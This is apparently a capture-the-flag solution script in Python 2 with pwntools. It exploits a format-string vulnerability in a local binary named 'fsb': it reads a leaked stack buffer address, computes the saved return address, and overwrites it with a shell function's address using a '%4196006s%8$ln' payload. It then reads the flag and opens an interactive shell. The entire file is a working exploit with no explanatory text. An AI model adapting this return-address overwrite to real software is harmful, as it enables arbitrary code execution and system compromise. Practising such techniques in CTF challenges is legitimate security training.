from pwn import * 

# AAAAAAAA  %p  %p  %p  %p  %p   %p  %p
# AAAAAAAA rsi rdx rcx  r8  r9? rsp  buf

s = process('./fsb')

shell = 0x4006a6 # 4196006

s.recvuntil("Addr : 0x")
buf = int(s.recv(12), 16)
ret = buf+0x38

print 'buf : ' + str(int(buf))
print 'ret : ' + str(int(ret))

s.recv()
s.sendline("AAAAAAAAAAAAAAAA"+p64(ret))
s.recv()

s.sendline("%4196006s%8$ln")
s.recv()

s.sendline("cat flag")
s.interactive()


